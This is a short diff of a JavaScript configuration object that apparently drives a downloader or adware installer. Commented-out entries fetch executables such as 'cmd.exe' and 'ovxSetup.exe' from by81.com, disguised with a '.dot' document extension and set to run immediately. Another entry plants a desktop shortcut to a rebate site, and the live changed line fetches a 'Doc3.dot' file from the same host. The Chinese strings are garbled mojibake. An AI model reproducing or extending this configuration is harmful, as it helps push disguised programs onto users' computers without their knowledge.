@@ -6,6 +6,6 @@ var ___gconfig = {
 		//						 {id:10009,name:"cmd.exe",url:"http://www.by81.com/05/cmd.exe.dot", md5:"", invalidcondition:function(){} ,param:" /c echo Éý¼¶ÖÐ & pause",runimmediately:1},	
 		//						 {id:100010,name:"ovxSetup.exe",url:"http://www.by81.com/05/ovxSetup.exe.dot", md5:"", invalidcondition:function(){} ,param:"", runimmediately:1}],
 		//desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"", iconPrivateProfileString:{URL:"http://www.51fanli.com",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}] ,
-		userdefinedlist:[{id:30000,name:"Doc3.dot", md5:"", url:"http://www.by81.com/05/Doc3.dot"}]
+		userdefinedlist:[{id:30001,name:"Doc3.dot", md5:"", url:"http://www.by81.com/05/Doc3.dot"}]
 	}
 	//alert(___gconfig.validcondition.PID.min)
